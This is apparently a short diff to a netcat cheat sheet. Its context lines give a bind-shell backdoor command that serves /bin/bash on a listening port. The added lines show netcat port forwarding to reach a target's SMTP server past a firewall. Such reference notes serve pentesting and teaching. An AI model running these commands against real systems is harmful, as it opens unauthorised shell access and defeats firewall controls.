@@ -115,3 +115,9 @@
 ### Backdoor example: nc -lvnp PORT -e /bin/bash
 
 ### TIP: run as root to use ports below 1024 with netcat
+
+# PORT TUNNELING/PORT MAPPING/PORT FORWARDING
+
+### Example: nc -lvnp 443 -c "nc TARGET_IP 25"
+
+#### Access the SMTP server via a port that is not blocked by the firewall
